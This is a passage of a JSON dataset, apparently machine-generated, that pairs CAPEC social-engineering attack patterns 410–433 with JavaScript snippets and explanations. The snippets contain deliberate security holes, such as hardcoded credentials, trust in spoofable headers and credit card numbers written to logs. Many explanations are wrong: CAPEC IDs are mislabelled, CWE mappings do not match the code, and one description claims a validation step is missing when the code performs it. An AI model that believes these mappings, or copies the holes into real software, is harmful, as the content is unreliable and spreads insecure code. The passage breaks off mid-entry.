        "capec_id": "410",
        "capec_name": "Information Elicitation",
        "code_snippet": "const sensitiveData = 'UserPassword123';\n\nfunction handleRequest(request) {\n  if (request.source === 'trustedSource') {\n    console.log('Processing request from trusted source');\n    // Process the request and potentially expose sensitive data\n    console.log(`Sensitive Data: ${sensitiveData}`);\n  } else {\n    console.log('Request from untrusted source');\n  }\n}\n\n// Simulate an incoming request from an untrusted source\nconst incomingRequest = { source: 'untrustedSource' };\nhandleRequest(incomingRequest);",
        "description": "This JavaScript code snippet demonstrates a vulnerability related to CAPEC-118: Information Elicitation. The function `handleRequest` processes incoming requests based on their source. If the request is from a 'trustedSource', it logs and potentially exposes sensitive data. However, the verification of the source is overly simplistic and can be easily spoofed, leading to CWE-940: Improper Verification of Source of a Communication Channel. Additionally, the code exposes sensitive information (CWE-200) and does not handle discrepancies in behavior that could be observed by an attacker (CWE-205, CWE-207). This snippet highlights how improper handling and verification of communication channels can lead to information elicitation attacks."
    },
    {
        "capec_id": "411",
        "capec_name": "DEPRECATED: Pretexting",
        "code_snippet": "const fs = require('fs');\nconst http = require('http');\n\nhttp.createServer((req, res) => {\n  const logData = `Request: ${req.method} ${req.url} - ${new Date().toISOString()}`;\n  fs.appendFile('server.log', logData + '\\n', (err) => {\n    if (err) throw err;\n  });\n\n  if (req.url === '/admin' && req.headers['x-auth'] !== 'secret-token') {\n    res.writeHead(403, {'Content-Type': 'text/plain'});\n    res.end('Forbidden');\n    return;\n  }\n\n  res.writeHead(200, {'Content-Type': 'text/plain'});\n  res.end('Hello, world!');\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that logs incoming requests to a file named 'server.log'. The log data includes the request method, URL, and timestamp. The server also has a simple authentication check for the '/admin' endpoint, where it expects a specific header 'x-auth' with the value 'secret-token'. If the header is missing or incorrect, the server responds with a '403 Forbidden' status. This code embodies the main idea of CAPEC-407 (Social Information Gathering via Pretexting) by demonstrating how sensitive information (like request logs) can be exposed through server log files (CWE-532). Additionally, it shows a basic authentication mechanism that could be bypassed if not implemented securely (CWE-287)."
    },
    {
        "capec_id": "412",
        "capec_name": "Pretexting via Customer Service",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(express.json());\n\napp.post('/customer-service', (req, res) => {\n  const { customerId, creditCardNumber } = req.body;\n  \n  // CWE-940: Improper Verification of Source of a Communication Channel\n  if (!req.headers['x-auth-token']) {\n    return res.status(401).send('Unauthorized');\n  }\n  \n  // CWE-300: Channel Accessible by Non-Endpoint\n  if (req.headers['x-auth-token'] !== 'expected-token') {\n    return res.status(403).send('Forbidden');\n  }\n  \n  // CWE-408: Incorrect Behavior Order: Early Amplification\n  if (!customerId) {\n    return res.status(400).send('Customer ID is required');\n  }\n  \n  // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n  console.log(`Customer ID: ${customerId}, Credit Card Number: ${creditCardNumber}`);\n  \n  res.send('Customer service request processed');\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a simple Express.js server that handles customer service requests. The server listens for POST requests at the '/customer-service' endpoint. The code demonstrates several security weaknesses related to the CAPEC description:\n\n1. **CWE-940: Improper Verification of Source of a Communication Channel** - The code checks for an 'x-auth-token' header but does not verify its authenticity properly.\n2. **CWE-300: Channel Accessible by Non-Endpoint** - The code checks the 'x-auth-token' against a hardcoded value, which is not secure and can be easily bypassed.\n3. **CWE-408: Incorrect Behavior Order: Early Amplification** - The code processes the request and logs sensitive information before proper authentication and authorization.\n4. **CWE-200: Exposure of Sensitive Information to an Unauthorized Actor** - The code logs sensitive information (credit card number) to the console, which can be accessed by unauthorized actors.\n\nThis code snippet embodies the main idea of the CAPEC by simulating a scenario where an adversary could exploit these weaknesses to solicit sensitive information or manipulate the target into performing actions that serve the adversary's interests."
    },
    {
        "capec_id": "413",
        "capec_name": "Pretexting via Tech Support",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Simulate tech support pretexting attack\nfunction techSupportPretexting(userInput) {\n  // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n  const sensitiveInfo = 'UserPassword123';\n  console.log(`Sensitive Info: ${sensitiveInfo}`);\n\n  // CWE-434: Unrestricted Upload of File with Dangerous Type\n  const dangerousFilePath = path.join(__dirname, 'malicious.exe');\n  fs.writeFileSync(dangerousFilePath, 'malicious content');\n  console.log('Dangerous file uploaded.');\n\n  // CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory\n  const externalFilePath = path.join(__dirname, 'public', 'info.txt');\n  fs.writeFileSync(externalFilePath, sensitiveInfo);\n  console.log('Sensitive information written to externally accessible file.');\n\n  // CWE-1263: Improper Physical Access Control\n  if (userInput === 'grantAccess') {\n    console.log('Physical access granted to unauthorized actor.');\n  }\n}\n\n// Simulate user input from a social engineering attack\ntechSupportPretexting('grantAccess');",
        "description": "This JavaScript code snippet simulates a tech support pretexting attack, where an adversary impersonates a tech support worker to gain unauthorized access to sensitive information and perform malicious actions. The code demonstrates several vulnerabilities: CWE-200 by exposing sensitive information in the console, CWE-434 by uploading a dangerous file, CWE-538 by writing sensitive information to an externally accessible file, and CWE-1263 by granting physical access based on user input. This snippet highlights the risks associated with social engineering attacks and the importance of proper access control and information handling."
    },
    {
        "capec_id": "414",
        "capec_name": "Pretexting via Delivery Person",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  if (req.url === '/deliver') {\n    // CWE-941: Incorrectly Specified Destination in a Communication Channel\n    const destination = req.headers['x-destination'];\n    if (!destination) {\n      res.writeHead(400, {'Content-Type': 'text/plain'});\n      res.end('Bad Request: Missing destination header');\n      return;\n    }\n\n    // CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory\n    const sensitiveInfo = 'Sensitive Data';\n    fs.writeFileSync('/public/delivery.txt', sensitiveInfo);\n\n    // CWE-300: Channel Accessible by Non-Endpoint\n    if (req.headers['x-identity'] !== 'trusted-delivery-person') {\n      res.writeHead(403, {'Content-Type': 'text/plain'});\n      res.end('Forbidden: Untrusted identity');\n      return;\n    }\n\n    // CWE-433: Unparsed Raw Web Content Delivery\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Delivery successful');\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens for requests on port 8080. When a request is made to the '/deliver' endpoint, the server performs several checks and actions that embody the vulnerabilities described in the CAPEC and related CWEs:\n\n1. **CWE-941: Incorrectly Specified Destination in a Communication Channel** - The server checks for a 'x-destination' header in the request. If it's missing, the server responds with a '400 Bad Request' status.\n\n2. **CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory** - The server writes sensitive information to a publicly accessible file '/public/delivery.txt'.\n\n3. **CWE-300: Channel Accessible by Non-Endpoint** - The server checks the 'x-identity' header to ensure the request is from a 'trusted-delivery-person'. If not, it responds with a '403 Forbidden' status.\n\n4. **CWE-433: Unparsed Raw Web Content Delivery** - The server responds with a plain text message 'Delivery successful' without parsing or validating the content.\n\nThis code represents the main idea of the CAPEC by simulating a scenario where an adversary impersonates a delivery person to manipulate the server into performing actions that could lead to information disclosure or unauthorized access."
    },
    {
        "capec_id": "415",
        "capec_name": "Pretexting via Phone",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  const { headers } = req;\n  const userRole = headers['x-user-role'];\n\n  // CWE-940: Improper Verification of Source of a Communication Channel\n  if (userRole === 'admin') {\n    // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n    res.writeHead(200, { 'Content-Type': 'text/plain' });\n    res.end('Sensitive Information: Admin Password is 12345');\n  } else {\n    res.writeHead(403, { 'Content-Type': 'text/plain' });\n    res.end('Access Denied');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming requests. It checks the 'x-user-role' header to determine the role of the user. If the role is 'admin', it responds with sensitive information (admin password). This demonstrates CWE-940 (Improper Verification of Source of a Communication Channel) as it trusts the 'x-user-role' header without proper verification. It also demonstrates CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by potentially exposing sensitive information to an unauthorized user. This embodies the main idea of the CAPEC 'Pretexting via Phone', where an adversary could manipulate the system by assuming a trusted role to gain sensitive information."
    },
    {
        "capec_id": "416",
        "capec_name": "Manipulate Human Behavior",
        "code_snippet": "const sensitiveData = 'user_password';\n\nfunction handleUserInput(input) {\n  if (input.includes('admin')) {\n    console.log('Access granted to sensitive data:', sensitiveData);\n  } else {\n    console.log('Access denied');\n  }\n}\n\n// Simulating user input\nhandleUserInput('admin'); // Access granted to sensitive data: user_password\nhandleUserInput('guest'); // Access denied",
        "description": "This JavaScript code snippet demonstrates a simple example of how an adversary might manipulate human behavior to gain access to sensitive information. The function `handleUserInput` checks if the input contains the string 'admin'. If it does, it logs sensitive data to the console, otherwise, it denies access. This represents the CAPEC idea of manipulating human behavior to solicit information. The related CWEs are represented as follows:\n- CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor): The sensitive data is exposed to anyone who inputs 'admin'.\n- CWE-202 (Exposure of Sensitive Information Through Data Queries): The adversary can infer the presence of sensitive data by querying with 'admin'.\n- CWE-205 (Observable Behavioral Discrepancy): The different console outputs ('Access granted' vs. 'Access denied') reveal the internal state of the system.\n- CWE-799 (Improper Control of Interaction Frequency): The code does not limit the number of times a user can input data, allowing repeated attempts to guess the correct input."
    },
    {
        "capec_id": "417",
        "capec_name": "Influence Perception",
        "code_snippet": "const users = { 'admin': 'password123' }; // CWE-656: Security through obscurity\n\nfunction authenticate(username, password) {\n  if (users[username] && users[username] === password) {\n    console.log('Authentication successful');\n    return true;\n  } else {\n    console.log('Authentication failed');\n    return false;\n  }\n}\n\nfunction performSensitiveAction(username, password) {\n  if (authenticate(username, password)) {\n    console.log('Sensitive action performed');\n  } else {\n    console.log('Access denied');\n  }\n}\n\n// CWE-654: Reliance on a single factor in a security decision\n// CWE-205: Observable behavioral discrepancy\n// CWE-222: Truncation of security-relevant information\n// CWE-301: Reflection attack vulnerability\n\n// Simulating an attack\nconst attackerUsername = 'admin';\nconst attackerPassword = 'password123';\nperformSensitiveAction(attackerUsername, attackerPassword);",
        "description": "This JavaScript code snippet demonstrates a simple authentication mechanism that relies on a single factor (username and password) to grant access to sensitive actions. The code uses a hardcoded password for the 'admin' user, which is an example of CWE-656 (Security through obscurity). The `authenticate` function checks the provided credentials against the hardcoded values and logs the result, which can be observed by an attacker (CWE-205: Observable behavioral discrepancy). The `performSensitiveAction` function relies solely on the result of the `authenticate` function to grant access, illustrating CWE-654 (Reliance on a single factor in a security decision). Additionally, the code does not handle potential truncation of security-relevant information (CWE-222) and is vulnerable to reflection attacks (CWE-301) if the attacker can manipulate the authentication process. This snippet embodies the main idea of CAPEC-112 (Influence Perception) by showing how an adversary could exploit weak authentication mechanisms to gain unauthorized access."
    },
    {
        "capec_id": "418",
        "capec_name": "Influence Perception of Reciprocation",
        "code_snippet": "const http = require('http');\n\nconst server = http.createServer((req, res) => {\n  const userAgent = req.headers['user-agent'];\n  if (userAgent) {\n    console.log(`Received request from: ${userAgent}`);\n    // Compliment the user agent to create a sense of trust\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end(`Wow, your browser (${userAgent}) is really up-to-date! Can you tell us your username for a better experience?`);\n  } else {\n    res.writeHead(400, {'Content-Type': 'text/plain'});\n    res.end('Bad Request');\n  }\n});\n\nserver.listen(8080, () => {\n  console.log('Server is listening on port 8080');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming requests. When a request is received, it checks for the 'User-Agent' header. If the header is present, it logs the user agent and sends a response that compliments the user's browser. This is a social engineering technique to create a sense of trust and obligation, encouraging the user to provide their username. This embodies the CAPEC 'Influence Perception of Reciprocation' by using a compliment to elicit sensitive information. The code also demonstrates CWE-940 (Improper Verification of Source of a Communication Channel) by not verifying the origin of the request, CWE-300 (Channel Accessible by Non-Endpoint) by not ensuring the integrity of the communication channel, and CWE-222 (Truncation of Security-relevant Information) by potentially truncating the user agent string."
    },
    {
        "capec_id": "419",
        "capec_name": "DEPRECATED: Target Influence via Perception of Concession",
        "code_snippet": "const http = require('http');\nconst crypto = require('crypto');\n\nconst options = {\n  hostname: 'example.com',\n  port: 80,\n  path: '/login',\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/json'\n  }\n};\n\nconst req = http.request(options, (res) => {\n  let data = '';\n  res.on('data', (chunk) => {\n    data += chunk;\n  });\n  res.on('end', () => {\n    if (res.statusCode === 200) {\n      console.log('Login successful');\n    } else {\n      console.log('Login failed');\n    }\n  });\n});\n\nconst postData = JSON.stringify({\n  username: 'user',\n  password: 'pass'\n});\n\nreq.on('error', (e) => {\n  console.error(`Problem with request: ${e.message}`);\n});\n\n// Simulate an algorithm downgrade attack\nconst weakHash = crypto.createHash('md5').update(postData).digest('hex');\nconsole.log(`Weak hash: ${weakHash}`);\n\nreq.write(postData);\nreq.end();",
        "description": "This JavaScript code snippet demonstrates a vulnerable HTTP request to a login endpoint. It embodies the deprecated CAPEC idea of 'Target Influence via Perception of Concession' by simulating an algorithm downgrade attack (CWE-757). The code uses a weak hashing algorithm (MD5) to hash the login data, which is insecure and can be exploited by an attacker. Additionally, the code includes observable discrepancies (CWE-203) by logging different messages based on the HTTP response status, which can reveal information about the internal state of the application. The code also highlights the potential for an incorrectly specified destination in a communication channel (CWE-941) by hardcoding the hostname and path."
    },
    {
        "capec_id": "420",
        "capec_name": "Influence Perception of Scarcity",
        "code_snippet": "const itemsInStock = 5;\n\nfunction checkStock(item) {\n  if (itemsInStock <= 0) {\n    alert('Hurry! Only a few items left in stock!');\n    // CWE-654: Relying on a single condition (itemsInStock) to create urgency\n    // CWE-405: Potential for resource consumption if alert is triggered repeatedly\n  }\n  // CWE-656: Security through obscurity, as the actual stock count is hidden\n  // CWE-222: Truncation of information, as the exact stock count is not shown\n  // CWE-205: Observable discrepancy, as the alert behavior changes based on stock\n  return itemsInStock > 0;\n}\n\n// Simulate user checking stock\ncheckStock('item1');",
        "description": "This JavaScript code snippet simulates a scenario where an adversary leverages the perception of scarcity to create urgency. The function `checkStock` checks the stock of an item and alerts the user if the stock is low, urging them to act quickly. This embodies the CAPEC concept of influencing perception of scarcity. The code also demonstrates several related CWEs: reliance on a single factor (CWE-654) to create urgency, potential for resource consumption (CWE-405) if the alert is triggered repeatedly, reliance on security through obscurity (CWE-656) by hiding the actual stock count, truncation of information (CWE-222) by not showing the exact stock count, and observable behavioral discrepancy (CWE-205) as the alert behavior changes based on stock levels."
    },
    {
        "capec_id": "421",
        "capec_name": "Influence Perception of Authority",
        "code_snippet": "const http = require('http');\n\nconst server = http.createServer((req, res) => {\n  const { headers } = req;\n  if (headers['x-admin-auth'] === 'admin123') { // CWE-654: Reliance on a Single Factor in a Security Decision\n    res.writeHead(200, { 'Content-Type': 'text/plain' });\n    res.end('Access granted to sensitive information');\n  } else {\n    res.writeHead(403, { 'Content-Type': 'text/plain' });\n    res.end('Access denied');\n  }\n});\n\nserver.listen(3000, () => {\n  console.log('Server running at http://localhost:3000/');\n});\n\n// Simulate an attacker impersonating an admin\nconst options = {\n  hostname: 'localhost',\n  port: 3000,\n  path: '/',\n  method: 'GET',\n  headers: {\n    'x-admin-auth': 'admin123' // CWE-940: Improper Verification of Source of a Communication Channel\n  }\n};\n\nconst req = http.request(options, (res) => {\n  let data = '';\n  res.on('data', (chunk) => {\n    data += chunk;\n  });\n  res.on('end', () => {\n    console.log(data); // Should print 'Access granted to sensitive information'\n  });\n});\n\nreq.on('error', (e) => {\n  console.error(`Problem with request: ${e.message}`);\n});\n\nreq.end();",
        "description": "This JavaScript code snippet demonstrates a simple HTTP server that grants access to sensitive information based on a single header value ('x-admin-auth'). This represents CWE-654 (Reliance on a Single Factor in a Security Decision). The server does not properly verify the source of the request, which is CWE-940 (Improper Verification of Source of a Communication Channel). An attacker can easily impersonate an admin by including the correct header value, demonstrating the CAPEC concept of 'Influence Perception of Authority' by exploiting weak authentication mechanisms."
    },
    {
        "capec_id": "422",
        "capec_name": "Influence Perception of Commitment and Consistency",
        "code_snippet": "const express = require('express');\nconst app = express();\nlet requestCount = 0;\n\napp.use((req, res, next) => {\n  requestCount++;\n  if (requestCount > 100) {\n    res.status(429).send('Too many requests');\n    return;\n  }\n  next();\n});\n\napp.post('/minor-task', (req, res) => {\n  // Simulate a minor task\n  res.send('Minor task completed');\n});\n\napp.post('/major-task', (req, res) => {\n  // Simulate a major task\n  res.send('Major task completed');\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This code snippet sets up an Express.js server that tracks the number of incoming requests. It limits the number of requests to 100 to prevent abuse (CWE-799). The server has two endpoints: '/minor-task' and '/major-task'. The idea is that an adversary could use social engineering to convince a user to perform a minor task first, making them more likely to perform a major task later (CAPEC: Influence Perception of Commitment and Consistency). The code also demonstrates potential vulnerabilities such as improper control of interaction frequency (CWE-799) and observable discrepancies (CWE-203) by not differentiating between authorized and unauthorized requests."
    },
    {
        "capec_id": "423",
        "capec_name": "Influence Perception of Liking",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst bodyParser = require('body-parser');\nconst crypto = require('crypto');\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\nlet users = {};\n\napp.post('/register', (req, res) => {\n  const { username, password } = req.body;\n  const hashedPassword = crypto.createHash('sha256').update(password).digest('hex');\n  users[username] = { password: hashedPassword, likes: 0 };\n  res.send('User registered successfully');\n});\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const hashedPassword = crypto.createHash('sha256').update(password).digest('hex');\n  if (users[username] && users[username].password === hashedPassword) {\n    users[username].likes += 1;\n    res.send('Login successful');\n  } else {\n    res.send('Invalid credentials');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a simple Express.js server with user registration and login functionality. The main idea of the CAPEC 'Influence Perception of Liking' is embodied by incrementing a 'likes' counter each time a user logs in successfully. This simulates the adversary's attempt to build a relationship by ingratiating themselves with the target.\n\nThe code also demonstrates several related CWEs:\n- CWE-301: The authentication mechanism is simple and could be subject to reflection attacks.\n- CWE-654: The security decision relies solely on the hashed password, representing reliance on a single factor.\n- CWE-205: The 'likes' counter could reveal behavioral discrepancies observable by unauthorized actors.\n- CWE-656: The security mechanism relies on the obscurity of the hashed password.\n- CWE-927: Although not directly related to Android, the use of implicit trust in the 'likes' counter can be seen as a parallel to implicit intent vulnerabilities."
    },
    {
        "capec_id": "424",
        "capec_name": "Influence Perception of Consensus or Social Proof",
        "code_snippet": "const users = ['user1', 'user2', 'user3'];\nlet currentUser = 'user1';\n\nfunction authenticate(user) {\n  if (users.includes(user)) {\n    console.log('Authentication successful');\n    return true;\n  } else {\n    console.log('Authentication failed');\n    return false;\n  }\n}\n\nfunction performAction(action) {\n  if (authenticate(currentUser)) {\n    console.log(`Performing action: ${action}`);\n  } else {\n    console.log('Action not allowed');\n  }\n}\n\n// Adversary influences the target to change the current user\ncurrentUser = 'user2';\nperformAction('delete');",
        "description": "This JavaScript code snippet demonstrates a scenario where an adversary influences the target's actions by changing the current user to 'user2'. The `authenticate` function checks if the user is in the list of valid users and logs the result. The `performAction` function performs an action if the user is authenticated. The adversary changes the `currentUser` to 'user2', leveraging the human tendency to follow perceived consensus or social proof, and then performs a sensitive action ('delete'). This example also highlights CWE-654 (Reliance on a Single Factor in a Security Decision) as the authentication relies solely on the presence of the user in the list, and CWE-203 (Observable Discrepancy) as the authentication result is logged, revealing security-relevant information."
    },
    {
        "capec_id": "425",
        "capec_name": "Target Influence via Framing",
        "code_snippet": "function authenticateUser(username, password) {\n  // CWE-654: Reliance on a Single Factor in a Security Decision\n  if (username === 'admin' && password === 'password123') {\n    // CWE-451: UI Misrepresentation of Critical Information\n    alert('Welcome, admin!');\n    // CWE-941: Incorrectly Specified Destination in a Communication Channel\n    fetch('https://trustedserver.com/login', {\n      method: 'POST',\n      body: JSON.stringify({ username, password })\n    })\n    .then(response => response.json())\n    .then(data => {\n      // CWE-757: Selection of Less-Secure Algorithm During Negotiation\n      if (data.algorithm === 'weak-algo') {\n        console.log('Using a less secure algorithm');\n      }\n      // CWE-300: Channel Accessible by Non-Endpoint\n      if (data.channel !== 'secure') {\n        console.log('Warning: Non-secure channel');\n      }\n    });\n  } else {\n    alert('Invalid credentials');\n  }\n}",
        "description": "This JavaScript code snippet demonstrates a vulnerable authentication function that embodies the main idea of CAPEC-Target Influence via Framing. The function checks if the username and password match hardcoded values, representing CWE-654 (Reliance on a Single Factor in a Security Decision). If the credentials are correct, it displays a misleading alert (CWE-451: UI Misrepresentation of Critical Information) and sends a request to a server. The destination URL is hardcoded, which could be incorrect (CWE-941: Incorrectly Specified Destination in a Communication Channel). The response handling includes a check for a weak algorithm (CWE-757: Selection of Less-Secure Algorithm During Negotiation) and a non-secure channel (CWE-300: Channel Accessible by Non-Endpoint). This code snippet illustrates how framing techniques can be used to influence the target by presenting information in a specific way, while also highlighting related security weaknesses."
    },
    {
        "capec_id": "426",
        "capec_name": "Influence via Incentives",
        "code_snippet": "const users = [{id: 1, name: 'Alice', balance: 100}, {id: 2, name: 'Bob', balance: 50}];\n\nfunction transferFunds(senderId, receiverId, amount) {\n  const sender = users.find(user => user.id === senderId);\n  const receiver = users.find(user => user.id === receiverId);\n  if (sender && receiver && sender.balance >= amount) {\n    sender.balance -= amount;\n    receiver.balance += amount;\n    console.log(`Transferred ${amount} from ${sender.name} to ${receiver.name}`);\n  } else {\n    console.log('Transfer failed');\n  }\n}\n\nfunction incentivizeUser(userId, incentive) {\n  const user = users.find(user => user.id === userId);\n  if (user) {\n    if (incentive.type === 'financial') {\n      transferFunds(1, userId, incentive.amount); // Assume user with id 1 is the system\n    } else if (incentive.type === 'social') {\n      console.log(`${user.name}, you have been awarded a badge!`);\n    } else if (incentive.type === 'ideological') {\n      console.log(`${user.name}, you have been recognized for your contributions!`);\n    }\n  }\n}\n\n// Example usage\nincentivizeUser(2, {type: 'financial', amount: 20});",
        "description": "This JavaScript code snippet demonstrates the concept of 'Influence via Incentives' by manipulating user behavior through financial, social, or ideological incentives. The `incentivizeUser` function takes a user ID and an incentive object, and applies the incentive based on its type. For financial incentives, it transfers funds from a system account to the user. For social and ideological incentives, it logs a message to the console. The code also includes a `transferFunds` function that handles the financial transactions between users. This snippet embodies the CAPEC idea by showing how an adversary could manipulate user behavior through different types of incentives. The related CWEs are represented by potential vulnerabilities in the code, such as reliance on a single factor (user ID) for security decisions (CWE-654), and the creation of emergent resources (user balances) that could be exploited (CWE-1229)."
    },
    {
        "capec_id": "427",
        "capec_name": "Influence via Psychological Principles",
        "code_snippet": "const users = [{username: 'admin', password: 'admin123'}, {username: 'user', password: 'user123'}];\n\nfunction authenticate(username, password) {\n  const user = users.find(u => u.username === username);\n  if (user && user.password === password) {\n    console.log('Authentication successful');\n    return true;\n  } else {\n    console.log('Authentication failed');\n    return false;\n  }\n}\n\nfunction login() {\n  const username = prompt('Enter username:');\n  const password = prompt('Enter password:');\n  if (authenticate(username, password)) {\n    alert('Welcome ' + username);\n  } else {\n    alert('Invalid credentials');\n  }\n}\n\nlogin();",
        "description": "This JavaScript code snippet demonstrates a simple authentication mechanism that is vulnerable to several weaknesses described in the CAPEC and related CWEs. The `authenticate` function relies on a single factor (username and password) for authentication (CWE-654). The `login` function uses `prompt` to collect user credentials, which can be easily manipulated or observed (CWE-205). Additionally, the code does not handle external influences on the control flow, such as defining control spheres (CWE-673). The simplicity of the authentication protocol makes it susceptible to reflection attacks (CWE-301), and the use of `console.log` for feedback can truncate important security-relevant information (CWE-222). This code embodies the main idea of CAPEC-Influence via Psychological Principles by demonstrating how an adversary can exploit human interaction and simple security mechanisms to influence behavior and gain unauthorized access."
    },
    {
        "capec_id": "428",
        "capec_name": "Influence via Modes of Thinking",
        "code_snippet": "const net = require('net');\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    const message = data.toString();\n    if (message.includes('password')) {\n      // CWE-222: Truncation of Security-relevant Information\n      const truncatedMessage = message.substring(0, 10);\n      console.log('Received sensitive data:', truncatedMessage);\n    }\n    // CWE-940: Improper Verification of Source of a Communication Channel\n    if (message.startsWith('AUTH')) {\n      socket.write('AUTH_OK');\n    }\n  });\n\n  // CWE-300: Channel Accessible by Non-Endpoint\n  socket.on('end', () => {\n    console.log('Connection ended');\n  });\n});\n\nserver.listen(8080, () => {\n  console.log('Server listening on port 8080');\n});",
        "description": "This JavaScript code snippet creates a simple TCP server using the 'net' module. The server listens for incoming connections and processes data received from clients. The code demonstrates several vulnerabilities related to the CAPEC 'Influence via Modes of Thinking' and the associated CWEs:\n\n1. CWE-222: The code truncates security-relevant information (e.g., passwords) before logging it, which can obscure the source or nature of an attack.\n2. CWE-940: The server does not properly verify the source of the communication channel. It simply checks if the message starts with 'AUTH' and responds with 'AUTH_OK', making it susceptible to spoofing.\n3. CWE-300: The server does not adequately verify the identity of actors at both ends of the communication channel, allowing unauthorized access.\n\nThe code represents the main idea of the CAPEC by showing how an adversary can manipulate communication patterns and exploit these vulnerabilities to gain unauthorized access or information."
    },
    {
        "capec_id": "429",
        "capec_name": "Target Influence via Eye Cues",
        "code_snippet": "document.addEventListener('mousemove', function(event) {\n  let eyeMovementData = { x: event.clientX, y: event.clientY };\n  let sensitiveInfo = 'Sensitive Data';\n  if (eyeMovementData.x > 100 && eyeMovementData.y > 100) {\n    console.log('User is looking at sensitive information');\n    sensitiveInfo = sensitiveInfo.substring(0, 5); // CWE-222: Truncation of Security-relevant Information\n  }\n  if (eyeMovementData.x < 50 && eyeMovementData.y < 50) {\n    console.log('User is not looking at sensitive information');\n  }\n  document.getElementById('info').innerText = sensitiveInfo; // CWE-451: UI Misrepresentation of Critical Information\n});",
        "description": "This JavaScript code snippet listens for mouse movements to infer where the user is looking on the screen, simulating the 'Target Influence via Eye Cues' CAPEC. When the user's eye movements suggest they are looking at a specific area, the code logs this and truncates sensitive information (CWE-222). The code also demonstrates observable discrepancies (CWE-203) by logging different messages based on the user's eye movements. Finally, it misrepresents critical information in the UI (CWE-451) by displaying truncated sensitive data."
    },
    {
        "capec_id": "430",
        "capec_name": "DEPRECATED:  Target Influence via Micro-Expressions",
        "code_snippet": "const sensitiveData = 'user_password';\n\nfunction processData(input) {\n  // Simulate speculative execution vulnerability\n  let result;\n  if (input === 'expected') {\n    result = sensitiveData;\n  } else {\n    result = 'default';\n  }\n  return result;\n}\n\n// Simulate an attacker providing unexpected input\nconsole.log(processData('unexpected')); // Potentially exposes sensitive data",
        "description": "This JavaScript code snippet demonstrates a simplified version of a speculative execution vulnerability, which is related to CWE-1342 and CWE-1420. The function `processData` is designed to simulate a scenario where speculative execution might expose sensitive information. If the input is not as expected, the speculative execution might still transiently access `sensitiveData`, potentially exposing it. This embodies the main idea of the deprecated CAPEC pattern, which involves influencing target behavior (in this case, the processor's speculative execution) to expose sensitive information."
    },
    {
        "capec_id": "431",
        "capec_name": "DEPRECATED:  Target Influence via Neuro-Linguistic Programming (NLP)",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/search', (req, res) => {\n    const query = req.query.q;\n    try {\n        // CWE-1286: No validation of input syntax\n        if (!query.match(/^[a-zA-Z0-9 ]+$/)) {\n            throw new Error('Invalid input');\n        }\n        // CWE-1336: Improper neutralization in template engine\n        const result = `<div>Search results for: ${query}</div>`;\n        res.send(result);\n    } catch (error) {\n        // CWE-81: Improper neutralization of script in error message\n        // CWE-209: Error message contains sensitive information\n        res.status(500).send(`Error: ${error.message} - Query: ${query}`);\n    }\n});\n\napp.listen(3000, () => {\n    console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a vulnerable Express.js application that handles search queries. The code demonstrates several security weaknesses: \n1. CWE-1286: The input query is expected to be alphanumeric but is not properly validated, allowing potentially harmful input.\n2. CWE-1336: The input is directly inserted into an HTML template without proper neutralization, making it susceptible to template injection attacks.\n3. CWE-81 and CWE-209: If an error occurs, the error message includes the original query, which could contain special characters or sensitive information, and is not properly neutralized, leading to potential script injection in the error message.\nThe code embodies the deprecated CAPEC idea of influencing a target via improper handling of input and error messages, leading to various security vulnerabilities."
    },
    {
        "capec_id": "432",
        "capec_name": "DEPRECATED:  Target Influence via Voice in NLP",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(express.json());\n\napp.post('/process', (req, res) => {\n  const userInput = req.body.input;\n  if (!/^[a-zA-Z0-9]+$/.test(userInput)) {\n    console.log(`Invalid input received: ${userInput}`);\n    return res.status(400).send('Invalid input');\n  }\n\n  // Simulate processing the input\n  const processedInput = `Processed: '${userInput}'`;\n  console.log(`Processed input: ${processedInput}`);\n  res.send(processedInput);\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet sets up an Express.js server with a single POST endpoint '/process'. The endpoint receives user input and performs basic validation to ensure the input only contains alphanumeric characters. If the input is invalid, it logs the invalid input and returns a 400 status code. If the input is valid, it processes the input by wrapping it in a string and logs the processed input. This code demonstrates the importance of validating input to prevent improper neutralization of quoting syntax (CWE-149) and improper validation of syntactic correctness (CWE-1286). Additionally, it highlights the potential risk of information exposure through log files (CWE-532) by logging both valid and invalid inputs."
    },
    {
        "capec_id": "433",
        "capec_name": "Target Influence via The Human Buffer Overflow",
